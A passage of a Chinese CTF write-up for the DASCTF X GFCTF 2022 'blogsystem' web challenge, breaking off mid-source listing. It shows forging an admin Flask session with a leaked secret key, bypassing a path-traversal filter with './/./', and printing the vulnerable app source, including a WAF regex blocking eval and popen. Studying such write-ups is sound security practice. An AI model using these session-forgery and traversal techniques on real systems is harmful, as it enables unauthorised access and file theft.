      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF X GFCTF 2022十月赛 blogsystem</title>
      <link href="/undefined/17771.html"/>
      <url>/undefined/17771.html</url>
      
        <content type="html"><![CDATA[<p><strong>首先得感谢<a href="https://www.lengf233.top/">lengf</a>师傅给解答一些很傻的问题</strong></p><p>这个题后面涉及到的知识点之前还没学过，先看看吧<br>进入题目注册一个账号发现admin已经被注册，这里就要想到session伪造，以admin登录<br>要伪造session就得知道key，在Blog路由的<code>flask 基础总结</code>这篇文章找到key<br><img src="https://s1.ax1x.com/2022/12/27/zzBSnx.png" alt="zzBSnx.png"><br>然后用工具伪造<br><code>python flask_session_cookie_manager3.py encode -s 7his_1s_my_fav0rite_ke7 -t &quot;&#123;&#39;_permanent&#39;:True,&#39;username&#39;:&#39;admin&#39;&#125;&quot;</code><br>以admin登录会发现多了一个Download路由<br><img src="https://s1.ax1x.com/2022/12/27/zzBpB6.png" alt="zzBpB6.png"><br>点进入是一张图片，抓包，存在目录穿越，这里是用<code>.//./</code>绕过，源码过滤方式为<code>.replace(&#39;..&#39;, &#39;&#39;).replace(&#39;//&#39;, &#39;&#39;)</code><br><img src="https://s1.ax1x.com/2022/12/27/zzB9HK.png" alt="zzB9HK.png"><br>源码在app&#x2F;app.py<br><img src="https://s1.ax1x.com/2022/12/27/zzBiND.png" alt="zzBiND.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">//app.py</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">import</span> config  </span><br><span class="line">  </span><br><span class="line">app = Flask(__name__)  </span><br><span class="line">app.config.from_object(config)  </span><br><span class="line">app.secret_key = <span class="string">&#x27;7his_1s_my_fav0rite_ke7&#x27;</span>  </span><br><span class="line"><span class="keyword">from</span> model <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> view <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">app.register_blueprint(index, name=<span class="string">&#x27;index&#x27;</span>)  </span><br><span class="line">app.register_blueprint(blog, name=<span class="string">&#x27;blog&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.context_processor  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login_statue</span>():  </span><br><span class="line">    username = session.get(<span class="string">&#x27;username&#x27;</span>)  </span><br><span class="line">    <span class="keyword">if</span> username:  </span><br><span class="line">        <span class="keyword">try</span>:  </span><br><span class="line">            user = User.query.<span class="built_in">filter</span>(User.username == username).first()  </span><br><span class="line">            <span class="keyword">if</span> user:  </span><br><span class="line">                <span class="keyword">return</span> &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&#x27;name&#x27;</span>: user.name, <span class="string">&#x27;password&#x27;</span>: user.password&#125;  </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">            <span class="keyword">return</span> e  </span><br><span class="line">    <span class="keyword">return</span> &#123;&#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page_not_found</span>(<span class="params">e</span>):  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;404.html&#x27;</span>), <span class="number">404</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">500</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">internal_server_error</span>(<span class="params">e</span>):  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;500.html&#x27;</span>), <span class="number">500</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>通过导入模块判断是MVT架构，搜索一波</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">python3 manage.py startapp myweb</span><br><span class="line"></span><br><span class="line">这将创建一个目录myweb，其目录如下：此目录结构将容纳轮询应用程序。</span><br><span class="line"></span><br><span class="line">[<span class="meta">root@localhost demo</span>]<span class="meta"># tree mysite/</span></span><br><span class="line">mysite/</span><br><span class="line">├── manage.py</span><br><span class="line">├── mysite</span><br><span class="line">│   ├── __init__.py</span><br><span class="line">│   ├── settings.py</span><br><span class="line">│   ├── urls.py</span><br><span class="line">│   └── wsgi.py</span><br><span class="line">└── myweb</span><br><span class="line">    ├── admin.py</span><br><span class="line">    ├── apps.py</span><br><span class="line">    ├── __init__.py</span><br><span class="line">    ├── migrations</span><br><span class="line">    │   └── __init__.py</span><br><span class="line">    ├── models.py</span><br><span class="line">    ├── tests.py</span><br><span class="line">    └── views.py</span><br></pre></td></tr></table></figure><p>可以看到其结构，然后读取<code>view/__init__.py</code>发现在其中又导入了其他模块<br><img src="https://s1.ax1x.com/2022/12/27/zzBPAO.png" alt="zzBPAO.png"><br>接着读取index.py和blog.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">//index.py</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint, session, render_template, request, flash, redirect, url_for, Response, send_file  </span><br><span class="line"><span class="keyword">from</span> werkzeug.security <span class="keyword">import</span> check_password_hash  </span><br><span class="line"><span class="keyword">from</span> decorators <span class="keyword">import</span> login_limit, admin_limit  </span><br><span class="line"><span class="keyword">from</span> model <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">import</span> os  </span><br><span class="line">  </span><br><span class="line">index = Blueprint(<span class="string">&quot;index&quot;</span>, __name__)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@index.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@index.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:  </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:  </span><br><span class="line">        name = request.form.get(<span class="string">&#x27;name&#x27;</span>)  </span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)  </span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)  </span><br><span class="line">        user = User.query.<span class="built_in">filter</span>(User.username == username).first()  </span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:  </span><br><span class="line">            flash(<span class="string">&quot;该用户名已存在&quot;</span>)  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            user = User(username=username, name=name)  </span><br><span class="line">            user.password_hash(password)  </span><br><span class="line">            db.session.add(user)  </span><br><span class="line">            db.session.commit()  </span><br><span class="line">            flash(<span class="string">&quot;注册成功！&quot;</span>)  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@index.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:  </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:  </span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)  </span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)  </span><br><span class="line">        user = User.query.<span class="built_in">filter</span>(User.username == username).first()  </span><br><span class="line">        <span class="keyword">if</span> (user <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>) <span class="keyword">and</span> (check_password_hash(user.password, password)):  </span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = user.username  </span><br><span class="line">            session.permanent = <span class="literal">True</span>  </span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index.hello&#x27;</span>))  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            flash(<span class="string">&quot;账号或密码错误&quot;</span>)  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@index.route(<span class="params"><span class="string">&quot;/updatePwd&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>():  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:  </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;updatePwd.html&quot;</span>)  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:  </span><br><span class="line">        lodPwd = request.form.get(<span class="string">&quot;lodPwd&quot;</span>)  </span><br><span class="line">        newPwd1 = request.form.get(<span class="string">&quot;newPwd1&quot;</span>)  </span><br><span class="line">        newPwd2 = request.form.get(<span class="string">&quot;newPwd2&quot;</span>)  </span><br><span class="line">        username = session.get(<span class="string">&quot;username&quot;</span>)  </span><br><span class="line">        user = User.query.<span class="built_in">filter</span>(User.username == username).first()  </span><br><span class="line">        <span class="keyword">if</span> check_password_hash(user.password, lodPwd):  </span><br><span class="line">            <span class="keyword">if</span> newPwd1 != newPwd2:  </span><br><span class="line">                flash(<span class="string">&quot;两次新密码不一致！&quot;</span>)  </span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&quot;updatePwd.html&quot;</span>)  </span><br><span class="line">            <span class="keyword">else</span>:  </span><br><span class="line">                user.password_hash(newPwd2)  </span><br><span class="line">                db.session.commit()  </span><br><span class="line">                flash(<span class="string">&quot;修改成功！&quot;</span>)  </span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&quot;updatePwd.html&quot;</span>)  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            flash(<span class="string">&quot;原密码错误！&quot;</span>)  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;updatePwd.html&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@index.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@admin_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():  </span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;path&#x27;</span>):  </span><br><span class="line">        path = request.args.get(<span class="string">&#x27;path&#x27;</span>).replace(<span class="string">&#x27;..&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;//&#x27;</span>, <span class="string">&#x27;&#x27;</span>)  </span><br><span class="line">        path = os.path.join(<span class="string">&#x27;static/upload/&#x27;</span>, path)  </span><br><span class="line">        <span class="keyword">if</span> os.path.exists(path):  </span><br><span class="line">            <span class="keyword">return</span> send_file(path)  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;404.html&#x27;</span>, file=path)  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>,  </span><br><span class="line">                           yaml=<span class="string">&#x27;所谓『恶』，是那些只为了自己，利用和践踏弱者的家伙！但是，我虽然是这样，也知道什么是令人作呕的『恶』，所以，由我来制裁！&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@index.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():  </span><br><span class="line">    session.clear()  </span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index.hello&#x27;</span>))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line">//blog.py</span><br><span class="line"><span class="keyword">import</span> os  </span><br><span class="line"><span class="keyword">import</span> random  </span><br><span class="line"><span class="keyword">import</span> re  </span><br><span class="line"><span class="keyword">import</span> time  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> yaml  </span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint, render_template, request, session  </span><br><span class="line"><span class="keyword">from</span> yaml <span class="keyword">import</span> Loader  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> decorators <span class="keyword">import</span> login_limit, admin_limit  </span><br><span class="line"><span class="keyword">from</span> model <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">blog = Blueprint(<span class="string">&quot;blog&quot;</span>, __name__, url_prefix=<span class="string">&quot;/blog&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">data</span>):  </span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">r&#x27;apply|process|eval|os|tuple|popen|frozenset|bytes|type|staticmethod|\(|\)&#x27;</span>, <span class="built_in">str</span>(data), re.M | re.I):  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/writeBlog&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writeblog</span>():  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:  </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;writeBlog.html&#x27;</span>)  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:  </span><br><span class="line">        title = request.form.get(<span class="string">&quot;title&quot;</span>)  </span><br><span class="line">        text = request.form.get(<span class="string">&quot;text&quot;</span>)  </span><br><span class="line">        username = session.get(<span class="string">&#x27;username&#x27;</span>)  </span><br><span class="line">        create_time = time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)  </span><br><span class="line">        user = User.query.<span class="built_in">filter</span>(User.username == username).first()  </span><br><span class="line">        blog = Blog(title=title, text=text, create_time=create_time, user_id=user.<span class="built_in">id</span>)  </span><br><span class="line">        db.session.add(blog)  </span><br><span class="line">        db.session.commit()  </span><br><span class="line">        blog = Blog.query.<span class="built_in">filter</span>(Blog.create_time == create_time).first()  </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;blogSuccess.html&#x27;</span>, title=title, <span class="built_in">id</span>=blog.<span class="built_in">id</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/imgUpload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">imgUpload</span>():  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        file = request.files.get(<span class="string">&#x27;editormd-image-file&#x27;</span>)  </span><br><span class="line">        fileName = file.filename.replace(<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;&#x27;</span>)  </span><br><span class="line">        filePath = os.path.join(<span class="string">&quot;static/upload/&quot;</span>, fileName)  </span><br><span class="line">        file.save(filePath)  </span><br><span class="line">        <span class="keyword">return</span> &#123;  </span><br><span class="line">            <span class="string">&#x27;success&#x27;</span>: <span class="number">1</span>,  </span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;上传成功!&#x27;</span>,  </span><br><span class="line">            <span class="string">&#x27;url&#x27;</span>: <span class="string">&quot;/&quot;</span> + filePath  </span><br><span class="line">        &#125;  </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">        <span class="keyword">return</span> &#123;  </span><br><span class="line">            <span class="string">&#x27;success&#x27;</span>: <span class="number">0</span>,  </span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;上传失败&#x27;</span>  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/showBlog/&lt;id&gt;&#x27;</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">showBlog</span>(<span class="params"><span class="built_in">id</span></span>):  </span><br><span class="line">    blog = Blog.query.<span class="built_in">filter</span>(Blog.<span class="built_in">id</span> == <span class="built_in">id</span>).first()  </span><br><span class="line">    comment = Comment.query.<span class="built_in">filter</span>(Comment.blog_id == blog.<span class="built_in">id</span>)  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;showBlog.html&quot;</span>, blog=blog, comment=comment)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&quot;/blogAll&quot;</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blogAll</span>():  </span><br><span class="line">    blogList = Blog.query.order_by(Blog.create_time.desc()).<span class="built_in">all</span>()  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;blogAll.html&#x27;</span>, blogList=blogList)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&quot;/update/&lt;id&gt;&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params"><span class="built_in">id</span></span>):  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:  </span><br><span class="line">        blog = Blog.query.<span class="built_in">filter</span>(Blog.<span class="built_in">id</span> == <span class="built_in">id</span>).first()  </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;updateBlog.html&#x27;</span>, blog=blog)  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:  </span><br><span class="line">        <span class="built_in">id</span> = request.form.get(<span class="string">&quot;id&quot;</span>)  </span><br><span class="line">        title = request.form.get(<span class="string">&quot;title&quot;</span>)  </span><br><span class="line">        text = request.form.get(<span class="string">&quot;text&quot;</span>)  </span><br><span class="line">        blog = Blog.query.<span class="built_in">filter</span>(Blog.<span class="built_in">id</span> == <span class="built_in">id</span>).first()  </span><br><span class="line">        blog.title = title  </span><br><span class="line">        blog.text = text  </span><br><span class="line">        db.session.commit()  </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;blogSuccess.html&#x27;</span>, title=title, <span class="built_in">id</span>=<span class="built_in">id</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&quot;/delete/&lt;id&gt;&quot;</span></span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):  </span><br><span class="line">    blog = Blog.query.<span class="built_in">filter</span>(Blog.<span class="built_in">id</span> == <span class="built_in">id</span>).first()  </span><br><span class="line">    db.session.delete(blog)  </span><br><span class="line">    db.session.commit()  </span><br><span class="line">    <span class="keyword">return</span> &#123;  </span><br><span class="line">        <span class="string">&#x27;state&#x27;</span>: <span class="literal">True</span>,  </span><br><span class="line">        <span class="string">&#x27;msg&#x27;</span>: <span class="string">&quot;删除成功！&quot;</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&quot;/myBlog&quot;</span></span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myBlog</span>():  </span><br><span class="line">    username = session.get(<span class="string">&#x27;username&#x27;</span>)  </span><br><span class="line">    user = User.query.<span class="built_in">filter</span>(User.username == username).first()  </span><br><span class="line">    blogList = Blog.query.<span class="built_in">filter</span>(Blog.user_id == user.<span class="built_in">id</span>).order_by(Blog.create_time.desc()).<span class="built_in">all</span>()  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;myBlog.html&quot;</span>, blogList=blogList)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&quot;/comment&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">comment</span>():  </span><br><span class="line">    text = request.values.get(<span class="string">&#x27;text&#x27;</span>)  </span><br><span class="line">    blogId = request.values.get(<span class="string">&#x27;blogId&#x27;</span>)  </span><br><span class="line">    username = session.get(<span class="string">&#x27;username&#x27;</span>)  </span><br><span class="line">    create_time = time.strftime(<span 